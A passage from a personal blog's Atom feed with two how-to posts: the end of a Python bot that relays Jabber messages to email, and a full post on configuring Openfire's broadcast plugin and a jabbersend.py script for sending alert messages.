        themessage = themessage.decode('unicode_escape').encode('ascii','ignore')
        message.Body = themessage

        sender = Mailer("127.0.0.1")
        sender.send(message)
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># Setup the command line arguments.
optp = OptionParser()

# Output verbosity options.
optp.add_option('-q', '--quiet', help='set logging to ERROR',
                action='store_const', dest='loglevel',
                const=logging.ERROR, default=logging.INFO)
optp.add_option('-d', '--debug', help='set logging to DEBUG',
                action='store_const', dest='loglevel',
                const=logging.DEBUG, default=logging.INFO)
optp.add_option('-v', '--verbose', help='set logging to COMM',
                action='store_const', dest='loglevel',
                const=5, default=logging.INFO)

# JID and password options.
optp.add_option("-j", "--jid", dest="jid",
                help="JID to use")
optp.add_option("-p", "--password", dest="password",
                help="password to use")

opts, args = optp.parse_args()

# Setup logging.
logging.basicConfig(level=opts.loglevel,
                    format='%(levelname)-8s %(message)s')

if opts.jid is None:
    opts.jid = raw_input("Username: ")
if opts.password is None:
    opts.password = getpass.getpass("Password: ")

# Setup the EchoBot and register plugins. Note that while plugins may
# have interdependencies, the order in which you register them does
# not matter.
xmpp = EchoBot(opts.jid, opts.password)
xmpp.register_plugin('xep_0030') # Service Discovery
xmpp.register_plugin('xep_0004') # Data Forms
xmpp.register_plugin('xep_0060') # PubSub
xmpp.register_plugin('xep_0199') # XMPP Ping

# If you are working with an OpenFire server, you may need
# to adjust the SSL version used:
# xmpp.ssl_version = ssl.PROTOCOL_SSLv3

# If you want to verify the SSL certificates offered by a server:
# xmpp.ca_certs = "path/to/ca/cert"

# Connect to the XMPP server and start processing XMPP stanzas.
if xmpp.connect():
    # If you do not have the dnspython library installed, you will need
    # to manually specify the name of the server if it does not match
    # the one in the JID. For example, to use Google Talk you would
    # need to use:
    #
    # if xmpp.connect(('talk.google.com', 5222)):
    #     ...
    xmpp.process(block=True)
    print("Done")
else:
    print("Unable to connect.")
</code></pre>

<p>```</p>

<h3>So how do I actually use this thing I just saw?</h3>

<p>Take the complete example and save it to a file like <code>bot.py</code>. Then, run it!
The complete example will echo the message just before it attempts to mail it. You can comment out line <strong>86</strong> to stop this from happening and run the script with the <code>-q</code> argument once you are happy all is working.</p>

<p>```bash sample run
% python bot.py -j &ldquo;<a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#109;&#121;&#69;&#x6d;&#97;&#105;&#x6c;&#x62;&#111;&#x74;&#64;&#x6d;&#121;&#x4a;&#x61;&#x62;&#98;&#101;&#x72;&#83;&#101;&#114;&#118;&#101;&#114;&#x2e;&#108;&#111;&#99;&#x61;&#108;">&#x6d;&#121;&#69;&#109;&#97;&#105;&#x6c;&#x62;&#x6f;&#x74;&#64;&#109;&#x79;&#x4a;&#x61;&#98;&#x62;&#x65;&#x72;&#x53;&#x65;&#114;&#x76;&#101;&#114;&#46;&#108;&#111;&#x63;&#97;&#108;</a>&rdquo;
Password:
INFO     Negotiating TLS
INFO     Using SSL version: 3
INFO     CERT: Time until certificate expiration: 952 days, 6:46:01.014041</p>

<p>Received Message:
This is a test message that will be mailed :D
```</p>

<h3>Things to note.</h3>

<ul>
<li>Even though the script allows you to specify a <code>-p</code> argument, I would highly discourage the usage of this. Any person that has access to your machine, be it legitimate or not, would then see your bot&rsquo;s process, with the password in the <code>ps</code> output!</li>
<li>Ensure the SMTP server specified in line <strong>96</strong> of the complete example allows yo to relay! Change it if needed.</li>
</ul>


<h3>Test! :D</h3>

<p>Send your bot a message and see if your mail arrives ^^</p>

<p><strong>EDIT</strong>: Modify the message encoding to ASCII as the utf8 stuff seems to barf out sometimes :|</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How To: Extremely simple python Jabber Broadcast Bot]]></title>
    <link href="http://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot/"/>
    <updated>2013-05-25T10:12:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot</id>
    <content type="html"><![CDATA[<h3>Bots! Bots! Bots!</h3>

<p>Generally speaking, a &lsquo;'bot&rsquo;&lsquo; is something that like <em>does work for you</em>. But, for this purpose, the need for a jabber bot came from the fact that I had to deal with a lot of email on a daily basis. This large amount of mail sometimes would cause me to completely miss critical mail alerts. Realising later that I could have prevented a catastrophe if I didn&rsquo;t miss that <strong>one</strong> email was just not on anymore. So, I started investigating ways to get the <em>important</em> stuff delivered faster.</p>

<p>As a team at work, we have long gone dropped the whole Skype group chat thing for our own Jabber server. My privacy related concerns back then was recently heightened <a href="http://lists.randombit.net/pipermail/cryptography/2013-May/004224.html">here</a> when a trap URL received a HEAD request from <strong>65.52.100.214</strong>. The user that received the URL in a chat was under strict instructions not to actually click it&hellip;</p>

<!--more-->


<h3>So, how do we do this?</h3>

<p>We implemented a <a href="http://www.igniterealtime.org/projects/openfire/">Openfire Server</a> that was really easy to setup and get going. Whats really nice about this Jabber server is that it supports plugins, some of which you can simply install via the web interface.</p>

<p>One such plugin that was installed is called the <a href="http://www.igniterealtime.org/projects/openfire/plugins/broadcast/readme.html">broadcast</a> plugin. This allows you to broadcast a message to all users on the server or those in defined groups.</p>

<p><img class="<a" src="href="http://i.imgur.com/6i8WhgR.png">http://i.imgur.com/6i8WhgR.png</a>">
Once this plugin is installed, some minor configuration is required to allow the broadcasting feature to work. In no way is this an extensive guide on the power of the plugin, but for the purpose of this post well just quickly rush over it.</p>

<p>Head over to <em>Server</em> &ndash;> <em>Server Manager</em> &ndash;> <em>System Properties</em>. From here you need to add the fields that are not there with the <strong>plugin.broadcast.</strong> prefix. Don&rsquo;t worry if they are not there, just add them.</p>

<p><img class="<a" src="href="http://i.imgur.com/XmU4d98.png">http://i.imgur.com/XmU4d98.png</a>"></p>

<p>The above is just a sample of a working configuration. Feel free to play around more with different setups.</p>

<p>With everything configured, you should now be able to send a message to something like <em>all@broadcast.jabber.server</em>. In my configuration, <em>plugin.broadcast.all2offline</em> is set to <strong>true</strong>. So, when a message is broadcasted and I was offline, I&rsquo;ll receive the broadcast as soon as I&rsquo;m back :)</p>

<h3>Introducing jabbersend.py</h3>

<p>With our jabber server now configured and working, we are ready to start automating things. From here we need two things. Something that will broadcast for us, and something <em>to</em> broadcast. The <em>what to broadcast</em> is entirely up to you, as the script will accept a text file to broadcast.</p>

<p>The only dependency you probably need to satisfy will be <code>xmpp</code>. This should be easily doable with something like <code>easy_install xmpp</code></p>

<p>```python Send a Jabber Message from a file</p>

<h1>!/usr/bin/python</h1>

<p>import sys,os,xmpp,time</p>

<h1>check the received arguments</h1>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print "Syntax: jabbersend.py JID textfile"
sys.exit(0)
</code></pre>

<h1>set the values to work with and read the file</h1>

<p>tojid=sys.argv[1]
m = open(sys.argv[2],&lsquo;r&rsquo;)
array = m.readlines()
m.close()</p>

<p>msg=&ldquo;&rdquo;
for record in array:</p>

<pre><code>    msg = msg + record
</code></pre>

<h1>configure your jabber account for the bot here.</h1>

<p>username = &lsquo;<a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#106;&#97;&#x62;&#98;&#101;&#114;&#x5f;&#x62;&#111;&#x74;&#x40;&#106;&#97;&#98;&#98;&#101;&#114;&#46;&#115;&#x65;&#114;&#x76;&#x65;&#x72;">&#x6a;&#x61;&#98;&#98;&#x65;&#x72;&#95;&#x62;&#111;&#x74;&#x40;&#106;&#x61;&#x62;&#98;&#x65;&#114;&#x2e;&#x73;&#101;&#x72;&#x76;&#101;&#114;</a>&rsquo; # from whom will the message be sent
password = &lsquo;jabber_bot_secret_password&rsquo;</p>

<p>jid=xmpp.protocol.JID(username)</p>

<h1>for debugging purposes, uncomment the below line so that &lsquo;debug&rsquo; is 1.</h1>

<h1>This makes the script very verbose though, but its helpful if you stuck ^^</h1>

<h1>cl=xmpp.Client(jid.getDomain(),debug=1)</h1>

<p>cl=xmpp.Client(jid.getDomain(),debug=[])</p>

<h1>Sadly I don&rsquo;t have a valid certificate for my jabber server, so this had to</h1>

<h1>be set to False. I do however recommend, if you can, to get a valid certificate</h1>

<h1>and enable this</h1>

<p>con=cl.connect(secure=False) # Set this to validate the servers certificate.
if not con:</p>

<pre><code>print "Could not connect"
sys.exit()
</code></pre>

<h1>authenticate the client</h1>

<p>auth=cl.auth(jid.getNode(),password,resource=jid.getResource())
if not auth:</p>

<pre><code>print "Authentication failed"
sys.exit()
</code></pre>

<h1>send the message</h1>

<p>id=cl.send(xmpp.protocol.Message(tojid, msg))</p>

<h1>some older servers will not send the message if you disconnect immediately</h1>

<p>time.sleep(1)
```</p>

<h3>We have the code, now use it!</h3>

<p>Save this code to something like <code>jabbersend.py</code> and execute it like this:
<code>python jabbersend.py all@broadcast.jabber.server message_file.txt</code></p>

<p>If all went OK, you should have received a message from <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#106;&#x61;&#x62;&#98;&#101;&#114;&#95;&#98;&#111;&#x74;&#x40;&#x6a;&#97;&#98;&#x62;&#x65;&#114;&#46;&#x73;&#x65;&#x72;&#118;&#x65;&#x72;">&#106;&#97;&#98;&#98;&#x65;&#114;&#x5f;&#x62;&#x6f;&#116;&#x40;&#106;&#97;&#x62;&#98;&#x65;&#114;&#x2e;&#115;&#101;&#114;&#x76;&#x65;&#114;</a> :P</p>

<p>Our internal implementation of this has been used in multiple areas. From broadcasting OSSEC alerts to broadcasting important events from cronjobs.
The OSSEC broadcasting I&rsquo;ll blog a little later, but you can obviously see the value that something like this brings. No more missing emails, if I receive a message from the bot, its important :)</p>

<p>I have a slightly more matured version of this in a python module that I&rsquo;ll share later. If you are interested in this, poke me on twitter @leonjza</p>
]]></content>
  </entry>
  
</feed>
